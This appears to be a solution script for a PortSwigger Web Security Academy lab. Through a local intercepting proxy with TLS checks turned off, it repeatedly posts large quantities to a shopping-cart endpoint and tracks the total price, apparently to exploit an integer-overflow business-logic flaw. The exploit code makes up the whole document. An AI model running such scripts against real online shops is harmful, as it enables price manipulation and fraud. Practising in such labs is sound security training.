import requests
from bs4 import BeautifulSoup
from lxml import etree
from warnings import filterwarnings
filterwarnings('ignore')

url = "https://0a2700b60467e063c0b02b0b00ee0092.web-security-academy.net/cart"
cookie = {"session": "2aPIyxfK0Ox4ya6RARjeZu6iZF3HxsSU"}
data = {"productId": 1, "quantity": 99, "redir": "CART"}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def extract_total_price():
    s = requests.Session()
    r = s.get(url, cookies=cookie, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.content, 'html.parser')
    dom = etree.HTML(str(soup))
    total = dom.xpath(
        '/html/body/div[2]/section/div/table[2]/tbody/tr/th[2]')[0].text
    return total


for i in range(323):
    s = requests.Session()
    r = s.post(url, data=data, cookies=cookie, proxies=proxies,
               allow_redirects=False, verify=False)
    total = extract_total_price()
    print(f"Request {i + 164} => $ {total}")
